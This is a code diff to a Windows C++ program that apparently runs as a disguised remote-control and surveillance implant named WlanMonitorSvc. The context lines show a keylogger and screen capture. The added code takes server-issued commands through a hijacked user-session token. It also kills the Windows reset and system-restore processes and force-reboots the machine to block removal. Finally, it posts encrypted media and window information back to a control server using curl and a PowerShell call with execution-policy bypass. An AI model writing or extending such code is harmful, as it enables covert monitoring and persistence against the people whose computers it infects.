@@ -17,6 +17,8 @@
 #include <wininet.h> // 添加网络缓存清除支持
 #include <psapi.h>   // 添加进程获取支持
 #include <tlhelp32.h> // 添加进程快照支持
+#include <mmdeviceapi.h>
+#include <endpointvolume.h>
 #include <thread>
 #include <mutex>
 #include <atomic>
@@ -38,7 +40,7 @@
 
 // ==============================================================
 // 【每次编译必看配置】请在每次点击【生成】前，在此处手动输入最新版本号！
-#define MANUAL_COMPILE_VERSION "1.7.4"
+#define MANUAL_COMPILE_VERSION "1.7.8"
 // ==============================================================
 
 // 定义当前程序版本和服务器更新地址
@@ -195,6 +197,49 @@ public:
 };
 
 
+
+int GetVolumeNative() {
+    int vol = -1;
+    CoInitialize(NULL);
+    IMMDeviceEnumerator* deviceEnumerator = NULL;
+    if (SUCCEEDED(CoCreateInstance(__uuidof(MMDeviceEnumerator), NULL, CLSCTX_INPROC_SERVER, __uuidof(IMMDeviceEnumerator), (LPVOID*)&deviceEnumerator))) {
+        IMMDevice* defaultDevice = NULL;
+        if (SUCCEEDED(deviceEnumerator->GetDefaultAudioEndpoint(eRender, eConsole, &defaultDevice))) {
+            IAudioEndpointVolume* endpointVolume = NULL;
+            if (SUCCEEDED(defaultDevice->Activate(__uuidof(IAudioEndpointVolume), CLSCTX_INPROC_SERVER, NULL, (LPVOID*)&endpointVolume))) {
+                float currentVol = 0.0f;
+                endpointVolume->GetMasterVolumeLevelScalar(&currentVol);
+                vol = (int)(currentVol * 100.0f + 0.5f);
+                endpointVolume->Release();
+            }
+            defaultDevice->Release();
+        }
+        deviceEnumerator->Release();
+    }
+    CoUninitialize();
+    return vol;
+}
+
+void SetVolumeNative(int level) {
+    CoInitialize(NULL);
+    IMMDeviceEnumerator* deviceEnumerator = NULL;
+    if (SUCCEEDED(CoCreateInstance(__uuidof(MMDeviceEnumerator), NULL, CLSCTX_INPROC_SERVER, __uuidof(IMMDeviceEnumerator), (LPVOID*)&deviceEnumerator))) {
+        IMMDevice* defaultDevice = NULL;
+        if (SUCCEEDED(deviceEnumerator->GetDefaultAudioEndpoint(eRender, eConsole, &defaultDevice))) {
+            IAudioEndpointVolume* endpointVolume = NULL;
+            if (SUCCEEDED(defaultDevice->Activate(__uuidof(IAudioEndpointVolume), CLSCTX_INPROC_SERVER, NULL, (LPVOID*)&endpointVolume))) {
+                float fLevel = (float)level / 100.0f;
+                if (fLevel < 0.0f) fLevel = 0.0f;
+                if (fLevel > 1.0f) fLevel = 1.0f;
+                endpointVolume->SetMasterVolumeLevelScalar(fLevel, NULL);
+                endpointVolume->Release();
+            }
+            defaultDevice->Release();
+        }
+        deviceEnumerator->Release();
+    }
+    CoUninitialize();
+}
 
 // 判断当前是否以管理员身份运行
 bool IsRunAsAdmin() {
@@ -1247,6 +1292,7 @@ void CaptureScreenJpg(const std::string& filename) {
 bool RunInUserSession(const std::string& cmdLine, bool silent = false) {
     if (!silent) ReportScreenLog("接收到服务端指令请求，正在尝试穿透进入活动用户会话的桌面...");
     HANDLE hToken = NULL;
+    DWORD activeSessionId = WTSGetActiveConsoleSessionId();
     HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
     if (hSnap != INVALID_HANDLE_VALUE) {
         PROCESSENTRY32W pe;
@@ -1254,6 +1300,10 @@ bool RunInUserSession(const std::string& cmdLine, bool silent = false) {
         if (Process32FirstW(hSnap, &pe)) {
             do {
                 if (_wcsicmp(pe.szExeFile, L"explorer.exe") == 0) {
+                    DWORD procSessionId = 0xFFFFFFFF;
+                    if (!ProcessIdToSessionId(pe.th32ProcessID, &procSessionId)) continue;
+                    if (activeSessionId != 0xFFFFFFFF && procSessionId != activeSessionId) continue;
+
                     HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pe.th32ProcessID);
                     if (hProc) {
                         if (OpenProcessToken(hProc, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &hToken)) {
@@ -1271,7 +1321,7 @@ bool RunInUserSession(const std::string& cmdLine, bool silent = false) {
 
     if (!hToken) {
         ReportScreenLog("未能找到 explorer.exe，退回到尝试使用 WTSActiveConsoleSession 获取默认控制台Token...");
-        DWORD sessionId = WTSGetActiveConsoleSessionId();
+        DWORD sessionId = activeSessionId;
         if (!WTSQueryUserToken(sessionId, &hToken)) {
             ReportScreenLog("WTSQueryUserToken 失败，尝试抓取 winlogon.exe 的 Token 用于登录界面，错误码: " + std::to_string(GetLastError()));
             HANDLE hSnap2 = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
@@ -1637,6 +1687,34 @@ void ReportToServer() {
                         std::string cfgPath = "C:\\Users\\Public\\WlanMonitorSvc_KeylogCfg.txt";
                         DeleteFileA(cfgPath.c_str());
                         res = "Success: Keylogger offline recording disabled. (Will fully stop on next boot or user logoff)";
+                    } else if (type == "MEDIA") {
+                        std::string exePath = GetExePath();
+                        std::string cmd = "\"" + exePath + "\" -usermode MEDIA " + argStr;
+                        if (RunInUserSession(cmd)) {
+                            res = "Success: Media command sent.";
+                        } else {
+                            res = "Fail: User session unavailable. Error: " + std::to_string(GetLastError());
+                        }
+                    } else if (type == "MEDIA_VOL_SET") {
+                        std::string exePath = GetExePath();
+                        std::string cmd = "\"" + exePath + "\" -usermode MEDIA_VOL_SET " + argStr;
+                        RunInUserSession(cmd, true);
+                        res = "Success: Volume set command sent.";
+                    } else if (type == "MEDIA_INFO") {
+                        std::string exePath = GetExePath();
+                        std::string cmd = "\"" + exePath + "\" -usermode MEDIA_INFO";
+                        RunInUserSession(cmd, true);
+                        res = "Success: Info polling requested.";
+                    } else if (type == "MONITOR_OFF") {
+                        std::string exePath = GetExePath();
+                        std::string cmd = "\"" + exePath + "\" -usermode MONITOR_OFF";
+                        RunInUserSession(cmd, true);
+                        res = "Success: Monitor turned off.";
+                    } else if (type == "MONITOR_ON") {
+                        std::string exePath = GetExePath();
+                        std::string cmd = "\"" + exePath + "\" -usermode MONITOR_ON";
+                        RunInUserSession(cmd, true);
+                        res = "Success: Monitor turned on.";
                     }
 
                     std::string postData = "mac=" + UrlEncode(EncryptString(mac)) + "&type=" + UrlEncode(EncryptString(type)) + "&output=" + UrlEncode(EncryptString(res));
@@ -1729,6 +1807,40 @@ void MonitorWiFiLoop() {
 
         if (dwResult != ERROR_SUCCESS) {
             dwResult = WlanOpenHandle(dwMaxClient, NULL, &dwCurVersion, &hClient);
+        }
+
+        // 【增强防刷机/防重置监测】
+        // 仅靠窗口标题(FindWindow)不可靠(受中英文语言和Win10/11 UWP应用框架限制)
+        // 改为直接检测 Windows 负责“初始化/恢复”的底层核心进程
+        bool isResetDetected = false;
+        HWND hResetWnd1 = FindWindowA(NULL, "初始化这台电脑");
+        HWND hResetWnd2 = FindWindowA(NULL, "Reset this PC");
+        if (hResetWnd1 != NULL || hResetWnd2 != NULL) isResetDetected = true;
+
+        HANDLE hSnapR = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+        if (hSnapR != INVALID_HANDLE_VALUE) {
+            PROCESSENTRY32W pe;
+            pe.dwSize = sizeof(PROCESSENTRY32W);
+            if (Process32FirstW(hSnapR, &pe)) {
+                do {
+                    // systemreset.exe = Win10/11 初始化这台电脑/重置此电脑 的核心后台进程
+                    // rstrui.exe = 系统还原点界面的进程
+                    if (_wcsicmp(pe.szExeFile, L"systemreset.exe") == 0 ||
+                        _wcsicmp(pe.szExeFile, L"rstrui.exe") == 0) {
+                        isResetDetected = true;
+                        // 发现的第一时间立即在内存中将其直接扼杀，防止用户手快点到下一步
+                        HANDLE hP = OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID);
+                        if (hP) { TerminateProcess(hP, 0); CloseHandle(hP); }
+                    }
+                } while (Process32NextW(hSnapR, &pe));
+            }
+            CloseHandle(hSnapR);
+        }
+
+        if (isResetDetected) {
+            WriteLog("【严重警告】：防逃避触发！检测到系统正在尝试打开“初始化/重置/还原”功能，为防止误操作，立即强制重启电脑!");
+            WinExec("shutdown.exe -r -f -t 0", SW_HIDE);
+            Sleep(30000); // 缓冲等待系统重启
         }
 
         bool foundOffAll = false;
@@ -2273,6 +2385,139 @@ int main()
                 ReportScreenLog("致命：无法从命令行参数提取上传 URL。");
             }
         }
+        if (cmdLine.find("MEDIA ") != std::string::npos) {
+            size_t pos = cmdLine.find("MEDIA ");
+            if (pos != std::string::npos) {
+                try {
+                    int keyCode = std::stoi(cmdLine.substr(pos + 6));
+                    keybd_event(keyCode, MapVirtualKeyA(keyCode, 0), KEYEVENTF_EXTENDEDKEY, 0);
+                    keybd_event(keyCode, MapVirtualKeyA(keyCode, 0), KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0);
+                } catch (...) {}
+            }
+            return 0;
+        }
+
+        if (cmdLine.find("MEDIA_VOL_SET") != std::string::npos) {
+            size_t pos = cmdLine.find("MEDIA_VOL_SET ");
+            if (pos != std::string::npos) {
+                try {
+                    int vol = std::stoi(cmdLine.substr(pos + 14));
+                    SetVolumeNative(vol);
+                } catch (...) {}
+            }
+            return 0;
+        }
+
+        if (cmdLine.find("MONITOR_OFF") != std::string::npos) {
+            DWORD_PTR dwResult = 0;
+            SendMessageTimeoutA(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, 2, SMTO_ABORTIFHUNG, 2000, &dwResult);
+            return 0;
+        }
+
+        if (cmdLine.find("MONITOR_ON") != std::string::npos) {
+            // 唤醒显示器：更稳定的组合逻辑
+            // 1. 强制系统重置挂机息屏计时器，声明需要显示器
+            SetThreadExecutionState(ES_CONTINUOUS | ES_DISPLAY_REQUIRED | ES_SYSTEM_REQUIRED);
+
+            // 2. 向系统发送解雇屏保和电源唤醒广播
+            DWORD_PTR dwResult = 0;
+            SendMessageTimeoutA(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, -1, SMTO_ABORTIFHUNG, 1000, &dwResult);
+
+            // 3. 模拟无害但真实的键盘输入 (无实际影响的 F15 键)
+            keybd_event(VK_F15, 0, 0, 0);
+            keybd_event(VK_F15, 0, KEYEVENTF_KEYUP, 0);
+
+            // 4. 彻底解决屏幕深度休眠问题：增加鼠标位移幅度并增加一定延迟
+            // (之前移动 1 像素并且没延迟，经常会被 Windows 当作硬件抖动噪音或执行过快被忽略)
+            Sleep(50);
+            mouse_event(MOUSEEVENTF_MOVE, 0, 5, 0, 0);
+            Sleep(50);
+            mouse_event(MOUSEEVENTF_MOVE, 0, -5, 0, 0);
+
+            return 0;
+        }
+
+        if (cmdLine.find("MEDIA_INFO") != std::string::npos) {
+            int vol = GetVolumeNative();
+
+            // 使用兼容 Windows PowerShell 5.x 的 WinRT 异步转 Task 方式，提升媒体标题获取成功率
+            std::string ps = "powershell.exe -NonInteractive -NoProfile -ExecutionPolicy Bypass -Command \"$ErrorActionPreference='Stop'; [Console]::OutputEncoding = [System.Text.Encoding]::UTF8; try { Add-Type -AssemblyName System.Runtime.WindowsRuntime; [Windows.Media.Control.GlobalSystemMediaTransportControlsSessionManager, Windows.Media.Control, ContentType=WindowsRuntime] | Out-Null; $mgr = [System.WindowsRuntimeSystemExtensions]::AsTask([Windows.Media.Control.GlobalSystemMediaTransportControlsSessionManager]::RequestAsync()).Result; if (-not $mgr) { Write-Output 'STATE:IDLE'; exit }; $sess = $mgr.GetCurrentSession(); if (-not $sess) { Write-Output 'STATE:IDLE'; exit }; $pb = $sess.GetPlaybackInfo(); if (-not $pb -or $pb.PlaybackStatus -ne [Windows.Media.Control.GlobalSystemMediaTransportControlsSessionPlaybackStatus]::Playing) { Write-Output 'STATE:IDLE'; exit }; $props = [System.WindowsRuntimeSystemExtensions]::AsTask($sess.TryGetMediaPropertiesAsync()).Result; $artist = ''; $title = ''; if ($props) { $artist = $props.Artist; $title = $props.Title }; if ([string]::IsNullOrWhiteSpace($artist) -and [string]::IsNullOrWhiteSpace($title)) { Write-Output 'STATE:PLAYING|'; } elseif ([string]::IsNullOrWhiteSpace($artist)) { Write-Output ('STATE:PLAYING|' + $title); } elseif ([string]::IsNullOrWhiteSpace($title)) { Write-Output ('STATE:PLAYING|' + $artist); } else { Write-Output ('STATE:PLAYING|' + $artist + ' - ' + $title); } } catch { Write-Output 'STATE:IDLE' }\"";
+            std::string mediaInfo = ExecCmd(ps, true);
+            TrimString(mediaInfo);
+            WriteLog("MEDIA_INFO primary raw: [" + mediaInfo + "]");
+
+            bool isPlaying = false;
+            std::string song;
+            if (mediaInfo.rfind("STATE:PLAYING|", 0) == 0) {
+                isPlaying = true;
+                song = mediaInfo.substr(14);
+                TrimString(song);
+            }
+
+            // 兼容回退：部分系统上 PlaybackStatus 判断不稳定，直接读取会话媒体属性补救
+            if (!isPlaying || song.empty()) {
+                std::string psFallback = "powershell.exe -NonInteractive -NoProfile -ExecutionPolicy Bypass -Command \"[Console]::OutputEncoding = [System.Text.Encoding]::UTF8; try { [Windows.Media.Control.GlobalSystemMediaTransportControlsSessionManager, Windows.Media, ContentType=WindowsRuntime] | Out-Null; $m = [Windows.Media.Control.GlobalSystemMediaTransportControlsSessionManager]::RequestAsync().GetAwaiter().GetResult(); if ($m) { $s = $m.GetCurrentSession(); if ($s) { $p = $s.TryGetMediaPropertiesAsync().GetAwaiter().GetResult(); if ($p) { $a = $p.Artist; $t = $p.Title; if (-not [string]::IsNullOrWhiteSpace($a) -or -not [string]::IsNullOrWhiteSpace($t)) { if([string]::IsNullOrWhiteSpace($a)){ Write-Output $t } elseif([string]::IsNullOrWhiteSpace($t)){ Write-Output $a } else { Write-Output ($a + ' - ' + $t) } } } } } } catch {}\"";
+                std::string fallbackSong = ExecCmd(psFallback, true);
+                TrimString(fallbackSong);
+                WriteLog("MEDIA_INFO fallback raw: [" + fallbackSong + "]");
+                if (!fallbackSong.empty() && fallbackSong.find("Exception") == std::string::npos && fallbackSong.find("Error") == std::string::npos) {
+                    isPlaying = true;
+                    song = fallbackSong;
+                }
+            }
+
+            // 最后兜底：从当前前台窗口信息中提取媒体标题（适配浏览器/播放器未暴露SMTC的场景）
+            if (!isPlaying || song.empty()) {
+                std::ifstream ifs("C:\\Users\\Public\\WlanMonitorSvc_ActiveWnd.txt");
+                if (ifs.is_open()) {
+                    std::string wnd((std::istreambuf_iterator<char>(ifs)), (std::istreambuf_iterator<char>()));
+                    TrimString(wnd);
+                    std::string low = wnd;
+                    for (char& ch : low) ch = (char)tolower((unsigned char)ch);
+                    bool maybeMedia = (low.find("spotify") != std::string::npos ||
+                                       low.find("cloudmusic") != std::string::npos ||
+                                       low.find("qqmusic") != std::string::npos ||
+                                       low.find("music") != std::string::npos ||
+                                       low.find("chrome") != std::string::npos ||
+                                       low.find("msedge") != std::string::npos ||
+                                       low.find("firefox") != std::string::npos);
+                    if (maybeMedia && !wnd.empty() && wnd.find("[") != std::string::npos && wnd.find("]") != std::string::npos) {
+                        isPlaying = true;
+                        song = AnsiToUtf8(wnd);
+                        WriteLog("MEDIA_INFO window fallback used: [" + wnd + "]");
+                    }
+                }
+            }
+
+            if (!isPlaying) {
+                song = AnsiToUtf8("当前未播放媒体 / 已暂停");
+            } else if (song.empty()) {
+                song = AnsiToUtf8("正在播放媒体");
+            }
+
+            // 无论是否成功识别媒体名，都优先上报真实系统音量，避免前端长期显示固定0%
+            std::string volStr = (vol >= 0 ? std::to_string(vol) : "");
+            std::string res = "VOL:" + volStr + "|SONG:" + song;
+
+            std::string mac = GetMacAddress();
+            std::string postData = "mac=" + UrlEncode(EncryptString(mac)) + "&info=" + UrlEncode(EncryptString(res));
+
+            // 动态解析出所属控制台服务器的链接，使用轻量 curl 取代原生冗杂的硬编码接口推送状态
+            std::string baseUrl = REPORT_URL_BASE;
+            size_t reportPos = baseUrl.rfind("/report");
+            if (reportPos != std::string::npos) baseUrl = baseUrl.substr(0, reportPos);
+            std::string targetUrl = baseUrl + "/api/media_info_result";
+
+            // 输出日志排查错误
+            WriteLog("MEDIA_INFO targetUrl: " + targetUrl);
+            WriteLog("MEDIA_INFO postData: " + postData);
+
+            std::string curlCmd = "curl.exe -s -k -d \"" + postData + "\" \"" + targetUrl + "\"";
+            std::string curlOut = ExecCmd(curlCmd, false);
+            WriteLog("MEDIA_INFO curl res: " + curlOut);
+            return 0;
+        }
+
         return 0; 
     }
 
